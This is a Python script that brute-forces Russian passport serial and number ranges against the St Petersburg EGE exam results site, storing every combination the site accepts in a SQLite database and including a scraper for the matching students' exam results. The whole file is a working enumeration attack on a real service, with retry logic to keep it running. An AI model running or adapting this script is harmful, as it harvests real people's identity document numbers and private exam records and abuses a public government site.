import requests
import time
import sqlite3

from termcolor import colored
from bs4 import BeautifulSoup

## TODO: Custom timeout

def parsePassports():
    egeObject = Ege(0, 0)

    con = sqlite3.connect('data.db')
    cur = con.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS passport_data\
                 (serial INTEGER,\
                  number INTEGER,\
                  UNIQUE(serial, number))")

    validPassports = 0
    lastErrors = 0

    for serial in range(4016, 4018):
        for number in range(600000, 700000):
            egeObject.serial = serial
            egeObject.number = number
            try:
                if egeObject.isPassportValid() is True:
                    print("Serial: ", serial, "; Number ", number, sep="")
                    cur.execute("INSERT OR IGNORE INTO passport_data VALUES (?, ?)", (serial, number))
                    con.commit()
                    validPassports += 1

                if (lastErrors > 0):
                    print(colored("Success", "green"))
                lastErrors = 0
            except Exception as e:
                print(colored("Handled exception", "yellow"))
                print("=" * 15)
                print(e)
                print("=" * 15)
                if lastErrors > 3:
                    print(colored("Too many errors, waiting 45 seconds and skipping...", "red"))
                    lastErrors = 0
                    time.sleep(45)
                else:
                    print(colored("Waiting 15 seconds...", "yellow"))
                    time.sleep(15)
                    lastErrors = lastErrors + 1
                    number = number - 1
                    print("Trying to resend the request...")


class Ege:

    serial = 0
    number = 0

    egeYear = 2021

    def __init__(self, serial, number):
        self.serial = serial
        self.number = number

    def isPassportValid(self) -> bool:
        """Проверяет правильно ли введёна серия и номер паспорта
        """
        request = self.__makeRequest()

        if (request.text.find("Участник не найден. Попробуйте уточнить серию и номер документа.") != -1):
            return False

        return True

    def __makeRequest(self):
        params = (
            ('mode', 'ege' + str(self.egeYear)),
        )
        data = {
          'Series': self.serial,
          'Number': self.number,
          'Login': '%CF%EE%EA%E0%E7%E0%F2%FC %F0%E5%E7%F3%EB%FC%F2%E0%F2%FB'
        }

        response = requests.post('https://www.ege.spb.ru/result/index.php', params=params, data=data)
        return response

    def getExams(self):
        return ()

    def __clearResults(self, inputData: list):
        """Очищает результаты экзаменов
            Убирает лишние пробелы и делает прочие штуки,
            возвращает откорректированный список
        """

        data = list()

        for i in range(0, len(inputData)):
            buf = inputData[i]
            buf = buf.text.replace('\n', '').replace('	', ' ')
            while "  " in buf:
                buf = buf.replace("  ", " ").strip()

            outElement = buf.split("Действующий результат")

            for x in range(len(outElement)):
                outElement[x] = outElement[x].strip()

            data.append(outElement)

        return data

    def getExamsStatus(self):
        """Возвращает статус экзаменов
        Получает список всех экзаменов с сайта и возвращает его в виде списка
        Каждый элемент в списке это пара "Название экзамена" - "Результат"
        """

        response = self.__makeRequest()

        soup = BeautifulSoup(response.text, 'html.parser')

        soup.prettify()
        quotes = soup.find_all('div', class_='exam-title row')

        return self.__clearResults(quotes)


parsePassports()


#myEge = Ege(1234, 12345678)
#print(myEge.isPassportValid())
#print(myEge.getExamsStatus())
